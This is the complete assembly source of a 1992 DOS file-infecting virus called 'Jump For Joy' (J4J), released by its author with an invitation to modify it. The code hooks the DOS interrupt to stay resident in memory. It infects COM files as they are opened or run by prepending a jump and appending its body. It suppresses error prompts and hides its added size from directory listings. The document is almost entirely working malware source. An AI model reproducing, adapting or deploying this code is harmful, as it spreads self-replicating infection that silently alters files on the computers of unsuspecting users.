;J4J - Jump For Joy, released 31 Jan 92, (c) Charlie of Demoralized Youth
;------------------------------------------------------------------------
;This source has been lying around for a veeeeeery long time, and I will
;*NOT* continue to make newer versions of J4J, so that is the reason
;why I release the source.
;
;It's been 'bout a month since my last glance on it, so it's maybe full
;of bugs, but anyways; assemble with A86
;
;Some idea's were taken from Omicron / FLIP B (Just the startup), but
;the rest was done by CHARLIE of DEMORALIZED YOUTH!
;
;Fuck this code up however you like...

        tsr_bytes       equ 1024
        tsr_para        equ (4096 / 16)

cpt1            equ $

        mov     ax,1991
        mov     bx,ax
        mov     cx,ax
        add     ax,13881
        int     21h
        cmp     ax,cx
        je      fail

        cmp     sp,-10h
        jb      fail

        mov     ax,cs
        dec     ax
        mov     es,ax
        cmp     byte es:[0000h],'Z'
        jne     fail

        mov     ax,es:[0003h]
        sub     ax,tsr_para
        jc      fail

        mov     es:[0003h],ax
        sub     word ptr es:[0012h],tsr_para
        mov     es,es:[0012h]

        call    $+3

cpt3            equ $

        pop     si
        mov     bx,si
        sub     si,(cpt3-cpt1)
        add     si,(cpt4-cpt1)
        push    cs
        push    si

        mov     si,bx
        sub     si,(cpt3-cpt1)
        mov     cx,offset total-100h
        mov     di,100h
        push    es
        rep     movsb
        mov     di,17Dh+2
        push    di

        retf
cpt4            equ $

fail:
        mov ax,100h
        push ax
        xor ax,ax
        xor bx,bx
        xor cx,cx
        xor dx,dx
        xor si,si
        xor di,di
        xor bp,bp
        push cs
        push cs
        pop es
        pop ds
        mov word [100h],20CDh
rpl1            equ $-2
        mov byte [102h],90h
rpl2            equ $-1
        ret

cpt2            equ $


jmp init


fcb_open        dw offset fcb_open_cont
exec            dw offset back
open_handle     dw offset back

new_int_21:
pushf

cmp ah,0Fh      ;open file using FCB's
jne not_open_fcb

call    fcb_to_asciiz
push dx
push ds

push cs
pop ds
mov dx,offset file

push cs:[fcb_open]
jmp file_main

fcb_open_cont:
pop ds
pop dx
jmp back

not_open_fcb:
;cmp ah,4Eh
;je handle_dir
;cmp ah,4Fh
;je handle_dir

cmp ah,11h
je fcb_dir
cmp ah,12h
je fcb_dir

cmp ah,3Eh
jne clodd
cmp bx,1991
jne clodd
xchg ax,bx
popf
iret

clodd:
cmp ah,3Dh
jne last_chance
push cs:[open_handle]
jmp file_main

last_chance:
cmp ax,4B00h
jne back

push cs:[exec]
jmp    file_main

back:
popf
db 0EAh
old_int_21      dw 0,0

handle_dir:
popf
call    int21

pushf
jnc back_handle_dir

cmp ax,0
jne back_handle_dir

call    stealth_dir_handle
sti

back_handle_dir:
popf
iret

fcb_dir:
popf
call    int21

pushf
cmp al,00h
jne back_fcb_dir

call    stealth_dir_fcb
sti

back_fcb_dir:
popf
iret

fcb_fname       equ 80h+1
fcb_fext        equ 80h+1+8

f_attr          equ 80h+15h
f_time          equ 80h+16h
f_date          equ 80h+18h
f_size          equ 80h+1Ah
f_asciiz        equ 80h+1Eh

f_handle        equ 80h
f_head_buffer   equ 80h+2
f_tail_buffer   equ 80h-3
f_type          equ 80h+6


repl0:  db 0E8h,?,?             ;call ????

;repl1:  db 0C7h,6,0,1,?,?       ;mov word [0100h],????
;        db 0C6h,6,2,1,?         ;mov byte [0102h],??

repl2:  push    bp
        mov     bp,sp
        sub     word [bp+2],3
        pop     bp

repl3:


db 'Elo‹, Elo‹, lam  sabakt ni?'

file_main:
pushf
;call other_file_type_check
;jnc file_main_pr1
jmp file_main_pr1

popf
jmp back

file_main_pr1:
push ax
push bx
push cx
push dx
push si
push di
push bp
push es
push ds

push cs
pop es

mov si,dx
mov di,offset file
cld
mov cx,65
rep movsb

push cs
pop ds

call    setup_24

;call cpu_check
;cmp ax,1
;je file_slutt

call file_info_get
jc file_is_done

call    mekke_fil

file_is_done:
call file_info_set

file_slutt:

call    rest_24

pop ds
pop es
pop bp
pop di
pop si
pop dx
pop cx
pop bx
pop ax
popf
ret ;jmp back

file    db 65 dup(0)

old_dta         dw ?,?

file_info_get:
        mov     ah,2Fh                          ;get DTA address
        call    int21
        mov     old_dta[2],es
        mov     old_dta[0],bx
        mov     ah,1Ah                          ;set DTA address
        push    cs
        pop     ds
        mov     dx,80h
        call    int21

        mov     ah,4Eh                          ;FIND FIRST (get info about
        mov     cx,1+2+32                       ;our file)
        mov     dx,offset file
        call    int21
        jnc     file_info_get_ok
        stc
        ret

        stc
        ret
file_info_get_ok:
        clc

        test    word [f_attr],4                 ;is the System attr. set?
        jnz     offset file_info_get_ok-2       ;yeah, so don't do it..

        cmp     word [fcb_fname],'OC'           ;like in: COmmand.com
        je      offset file_info_get_ok-2       ;the command-interpreter

        cmp     word [fcb_fname],'BI'           ;like in: IBmbio.com and IBmdos.com
        je      offset file_info_get_ok-2       ;the startup files for IBM-dos

        cmp     word [fcb_fext],'YS'            ;like in: country.SYs
        je      offset file_info_get_ok-2       ;device drivers and .SYS files

        mov     ax,4301h                        ;set attribute
        xor     cx,cx                           ;attr=0
        mov     dx,offset file
        call    int21

        mov     ax,3D02h                        ;open file
        mov     dx,offset file
        call    int21
        jnc     fig_open
fig_fail:
                stc
                ret
fig_open:
        mov     [f_handle],ax

        mov     bx,ax
        mov     ah,3Fh                          ;read from file
        mov     cx,3                            ;3 bytes
        mov     dx,f_head_buffer
        call    int21
        jnc     fig_read
        jmp     fig_fail

fig_read:
        cmp     ax,3
        jne     fig_fail

        mov     ax,4200h
        xor     cx,cx
        mov     dx,[f_size]
        sub     dx,3
        mov     bx,[f_handle]
        call    int21

        mov     ah,3Fh
        mov     cx,3
        mov     dx,f_tail_buffer
        call    int21

        cmp     word [f_size+2],0

        jnz     fig_fail
        cmp     [f_size],60000
        ja      fig_fail

        cmp     word [f_head_buffer],'MZ'               ;EXE 'ZM' ?
        je      file_is_exe
        cmp     word [f_head_buffer],'ZM'               ;EXE 'MZ' ?
        je      file_is_exe
        cmp     word [f_head_buffer],-1                 ;Device Driver ?
        je      fig_fail

        mov     byte [f_type],0                         ;filetype = COM
        clc
        ret
file_is_exe:
        mov     byte [f_type],1                         ;filetype = EXE
        clc
        ret

file_info_set:
        mov     ah,1Ah                                  ;set DTA address
        mov     dx,old_dta[0]
        mov     bx,old_dta[2]
        mov     ds,bx
        call    int21

        push    cs
        pop     ds

        mov     ax,4301h                                ;restore ATTRibutes
        mov     cx,[f_attr]
        mov     dx,offset file
        call    int21

        mov     ax,5701h                                ;restore DATE & TIME
        mov     bx,[f_handle]
        mov     cx,[f_time]
        and     cl,255-31
        or      cl,30
        mov     dx,[f_date]
        call    int21

        mov     ah,3Eh                                  ;close file
        mov     bx,[f_handle]
        call    int21
        ret

db '¨­¨--?!?'

mekke_fil:
        cmp [f_size],1023
        ja not_one_n0
        stc
        ret

not_one_n0:
        cmp byte ptr [f_type],0
        je not_one_n1
        stc
        ret

not_one_n1:
        cmp word ptr [f_tail_buffer],'4J'
        jne not_one
        stc
        ret

not_one:
        mov     ax,[f_size]                             ;calculate CALL
        sub     ax,3                                    ;length
        mov     repl0[1],ax

        mov     ax,word [f_head_buffer]
        mov     bl,byte [f_head_buffer]+2

        mov     [offset rpl1],ax
        mov     [offset rpl2],bl
;        mov     word ptr repl1[4],ax                    ;restore orig bytes
;        mov     repl1[10],bl                            ;after CALL...

        mov ax,4200h                                    ;seek to file_start
        mov bx,[f_handle]
        xor cx,cx
        mov dx,cx
        call int21

        mov ah,40h                                      ;write CALL XXXX
        mov bx,[f_handle]
        mov cx,3                                        ;3 bytes
        mov dx,offset repl0
        call int21

        mov ax,4202h                                    ;seek to EOF
        mov bx,[f_handle]
        xor cx,cx
        mov dx,cx
        call int21

;        mov ah,40h                                      ;write startup-code
;        mov bx,[f_handle]
;        mov cx,(offset repl3)-offset repl1
;              ;???? bytes
;        mov dx,offset repl1
;        call int21
;        jc replace_them_now

        mov ah,40h                                      ;write main code
        mov bx,[f_handle]
        mov cx,offset total-100h
        mov dx,100h
        call int21
        jc $+2+1+1
        clc
        ret

replace_them_now:
        mov ax,4200h                                    ;seek to beginning
        mov bx,[f_handle]                               ;of the file
        xor cx,cx
        mov dx,cx
        call int21

        mov ah,40h                                      ;error, so write
        mov bx,[f_handle]                               ;back 3 first bytes
        mov cx,3
        mov dx,f_head_buffer
        call int21
        stc
        ret


db 'Charlie says:  Support ()DEMORALIZED YOUTH() '

;;*************************************************************
;;* CPU checker, coded by Data Disruptor / RABiD Nat'nl Corp. *
;;*************************************************************
;cpu_check:
;        xor     ax,ax
;        push    ax
;        popf
;        pushf
;        pop     ax
;        and     ax,0f000h
;        cmp     ax,0f000h
;        je      mc_8086
;        mov     ax,0f000h
;        push    ax
;        popf
;        pushf
;        pop     ax
;        and     ax,0f000h
;        jz      mc_80286
;        mov     ax,3
;        ret
;mc_80286:
;        mov     ax,2
;        ret
;mc_8086:
;        mov     ax,1
;        ret


;***************************************
;
; Call previously saved Int 21h Handler
;
;***************************************
int21:
        pushf
        call    dword ptr cs:old_int_21
        ret

;**********************************************
;
; Int 24h (Critical Error Handler) Code & Data
;
;**********************************************
        err     dw 0

        old_24  dw ?,?
        new_24: inc cs:err
                mov al,0
                stc
                iret

;****************************************************************
;
; Fix so that Int 24h (Critical Error Handler) won't display the
; "abort, retry, fail?" message
;
;****************************************************************
setup_24:
        xor     ax,ax
        mov     ds,ax

        les     bx,[24h*4]

        push    cs
        pop     ds

        mov     word ptr old_24[0],bx
        mov     word ptr old_24[2],es

        mov     ds,ax
        mov     word ptr [24h*4],offset new_24
        mov     word ptr [24h*4+2],cs

        push    cs
        push    cs
        pop     es
        pop     ds
        ret

;**********************************************************
;
; Restore original Int 24h (Critical Error Handler) vector
;
;**********************************************************
rest_24:
        les     bx,cs:old_24

        xor     ax,ax
        mov     ds,ax

        mov     word ptr [24h*4],bx
        mov     word ptr [24h*4+2],es

        push    cs
        pop     ds
        ret


;*********************************************************
;
; Check if the filename has got an extension of .COM or
; .EXE. Returns with CY if not a valid filetype, or NC if
; it is a valid one.
;
;*********************************************************
other_fail:
        pop bp
        pop ds
        pop es
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        popf
        stc     ;return with CY
        ret

other_file_type_check:          ;here the main routine starts
        pushf
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push es
        push ds
        push bp

        mov     di,dx
        push    ds
        pop     es

        cld
        mov     cx,127
        xor     al,al
        repnz   scasb
        jne     other_fail
        dec     di
        dec     di
        dec     di
        dec     di
        dec     di

        xchg    si,di
        lodsb
        cmp     al,'.'
        jne     other_fail

        lodsw
        and     ax,0DFDFh
        cmp     ax,'OC'
        je      other_okfil
        cmp     ax,'XE'
        je      other_okfil
        jmp     other_fail

other_okfil:
        lodsb
        and     al,0DFh
        cmp     al,'M'
        je      other_okfil2
        cmp     al,'E'
        jne     other_fail

other_okfil2:
        pop bp
        pop ds
        pop es
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        popf
        clc     ;return with NC
        ret


stealth_dir_handle:
        jc done_stealthing_handle

        pushf
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push ds
        push es
        push bp

        mov ah,2Fh
        call int21

        mov ax,word ptr es:[bx+16h]
        mov ah,1Eh
        and al,1Fh
        cmp al,ah
        jne done_stealthing_handle

        cmp word es:[bx+1Ah+2],0
        jne done_stealthing_handle
        mov ax,word es:[bx+1Ah]
        sub ax,(offset total)-100h
        jc done_stealthing_handle
        mov word es:[bx+1Ah],ax

done_stealthing_handle:
        pop bp
        pop es
        pop ds
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        popf
        ret

stealth_dir_fcb:
        pushf
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push ds
        push es
        push bp

        mov ah,2Fh
        call int21

;        mov es,ds
;        mov bx,dx

        mov ax,word ptr es:[bx+14+10h]                  ;16h]
        mov ah,30 ;1Eh
        and al,31 ;1Fh
        cmp al,ah
        jne done_stealthing_fcb

        cmp word es:[bx+22+10h],0                       ;+10h+2],0
        jne done_stealthing_fcb

        mov ax,word es:[bx+20+10h]                      ;+10h]
        sub ax,(offset total)-100h
        jc done_stealthing_fcb
        mov word es:[bx+20+10h],ax

done_stealthing_fcb:
        pop bp
        pop es
        pop ds
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        popf
        ret




init:
cli
push cs
push cs
pop ds
pop es

mov ax,3521h
int 21h
mov word ptr old_int_21[0],bx
mov word ptr old_int_21[2],es
mov dx,offset new_int_21
mov ax,2521h
int 21h
sti

retf
fcb_to_asciiz:
pushf
push ax
push cx
push si
push di
push es

push cs
pop es
mov di,offset file

cld
mov si,dx ;fcb_start
lodsb
cmp al,0
je fcb_in_current_dir

add al,'A'
stosb
mov al,':'
stosb
jmp anyway

fcb_in_current_dir:
inc si

anyway:
mov si,dx
inc si
mov cx,8
fcb_file_name_xfer:
lodsb
cmp al,' '
je fcb_done_1
stosb
loop fcb_file_name_xfer

fcb_done_1:
mov al,'.'
stosb

mov si,dx       ;fcb_start
add si,1+8
mov cx,3
fcb_file_ext_xfer:
lodsb
cmp al,' '
je fcb_done_2
stosb
loop fcb_file_ext_xfer

fcb_done_2:
mov al,0
stosb

pop es
pop di
pop si
pop cx
pop ax
popf
ret


size    dw (offset total)-100h
db 'J4J'

total:






















































